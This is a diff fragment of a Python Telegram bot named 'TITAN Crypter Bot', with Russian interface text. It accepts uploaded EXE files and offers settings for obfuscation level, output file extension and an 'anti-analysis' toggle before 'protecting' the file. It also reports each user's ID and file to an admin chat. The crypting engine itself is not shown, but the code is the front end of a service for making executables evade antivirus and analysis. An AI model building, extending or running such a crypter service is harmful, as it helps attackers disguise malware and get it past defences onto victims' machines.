+                user_info = session.get('user_info', 'Unknown')
+                action_info = (
+                    f"🔒 <b>Успешная защита файла</b>\n"
+                    f"👤 Пользователь: {user_info}\n"
+                    f"👤 ID: {chat_id}\n"
+                    f"📄 Файл: {output_filename}\n"
+                    f"📏 Размер: {file_size} байт\n"
+                    f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}"
+                )
+                await self.notify_admin(action_info)
+                
+            else:
+                await context.bot.send_message(chat_id, f"❌ Ошибка: {result_message}")
+                
+        except Exception as e:
+            logger.error(f"Ошибка обработки файла: {e}")
+            await context.bot.send_message(chat_id, f"❌ Критическая ошибка: {str(e)}")
+        finally:
+            # Очистка временных файлов
+            try:
+                session = self.user_sessions.get(chat_id)
+                if session and session.get('file_path'):
+                    file_dir = os.path.dirname(session['file_path'])
+                    if file_dir and os.path.exists(file_dir):
+                        shutil.rmtree(file_dir)
+            except Exception as e:
+                logger.error(f"Ошибка очистки временных файлов: {e}")
+
+    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Обработчик нажатий на кнопки"""
+        try:
+            query = update.callback_query
+            await query.answer()
+            
+            chat_id = query.message.chat_id
+            data = query.data
+            
+            # Инициализация сессии если нужно
+            if chat_id not in self.user_sessions:
+                self.user_sessions[chat_id] = {
+                    'step': 'main_menu', 
+                    'settings': {
+                        'obfuscation_level': 20,
+                        'extension': '.exe',
+                        'anti_analysis': True
+                    }
+                }
+            
+            # Обработка действий
+            if data == "main_menu":
+                keyboard = [
+                    [InlineKeyboardButton("📁 Загрузить EXE файл", callback_data="upload_file")],
+                    [InlineKeyboardButton("⚙️ Настройки", callback_data="settings")],
+                    [InlineKeyboardButton("❓ Помощь", callback_data="help")]
+                ]
+                reply_markup = InlineKeyboardMarkup(keyboard)
+                
+                await query.edit_message_text(
+                    "🔒 <b>TITAN Crypter Bot</b>\n\nВыберите действие:",
+                    reply_markup=reply_markup,
+                    parse_mode='HTML'
+                )
+                
+            elif data == "upload_file":
+                await query.edit_message_text(
+                    "📁 <b>Загрузка файла</b>\n\n"
+                    "Пожалуйста, отправьте EXE файл как документ:",
+                    parse_mode='HTML'
+                )
+                
+            elif data == "settings":
+                await self.show_settings(update, context)
+                
+            elif data == "help":
+                await self.help_command(update, context)
+                
+            elif data == "configure":
+                await self.show_settings(update, context)
+                
+            elif data == "set_obfuscation":
+                await self.show_obfuscation_menu(update, context)
+                
+            elif data == "set_extension":
+                await self.show_extension_menu(update, context)
+                
+            elif data.startswith("set_obl_"):
+                level = int(data.split('_')[2])
+                self.user_sessions[chat_id]['settings']['obfuscation_level'] = level
+                await query.edit_message_text(f"✅ Уровень установлен: {level}")
+                await asyncio.sleep(1)
+                await self.show_settings(update, context)
+                
+            elif data.startswith("set_ext_"):
+                extension = data.split('_', 2)[2]
+                self.user_sessions[chat_id]['settings']['extension'] = extension
+                await query.edit_message_text(f"✅ Расширение установлено: {extension}")
+                await asyncio.sleep(1)
+                await self.show_settings(update, context)
+                
+            elif data == "toggle_anti_analysis":
+                current = self.user_sessions[chat_id]['settings']['anti_analysis']
+                self.user_sessions[chat_id]['settings']['anti_analysis'] = not current
+                status = "включен" if not current else "выключен"
+                await query.edit_message_text(f"✅ Анти-анализ {status}")
+                await asyncio.sleep(1)
+                await self.show_settings(update, context)
+                
+            elif data == "save_settings":
+                await query.edit_message_text("✅ Настройки сохранены!")
+                await asyncio.sleep(1)
+                await self.show_settings(update, context)
+                
+            elif data == "protect":
+                if not self.user_sessions[chat_id].get('file_path'):
+                    await query.edit_message_text("❌ Сначала загрузите файл!")
+                    return
+                    
+                await query.edit_message_text("🚀 Запуск защиты...")
+                
+                # Запуск в отдельном потоке
+                thread = threading.Thread(
+                    target=self.run_async_in_thread,
+                    args=(chat_id, context)
+                )
+                thread.daemon = True
+                thread.start()
+                
+        except Exception as e:
+            logger.error(f"Ошибка в button_handler: {e}")
+
+    def run(self):
+        """Запуск бота"""
+        try:
+            logger.info("Бот запускается...")
+            print("Titan Crypter Bot запускается...")
+            print(f"Токен: {BOT_TOKEN}")
+            print(f"Admin ID: {ADMIN_CHAT_ID}")
+            
+            # Исправленный запуск polling
+            self.application.run_polling(
+                allowed_updates=Update.ALL_TYPES,
+                drop_pending_updates=True
+            )
+            
+        except KeyboardInterrupt:
+            logger.info("Бот остановлен пользователем")
+            print("\nБот остановлен")
+        except Exception as e:
+            logger.error(f"Критическая ошибка при запуске: {e}")
+            print(f"Критическая ошибка: {e}")
 
 if __name__ == "__main__":
-    start_bot()
+    # Проверка токена
+    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
+        print("❌ Установите токен бота!")
+        exit(1)
+        
+    bot = TitanCrypterBot()
+    bot.run()
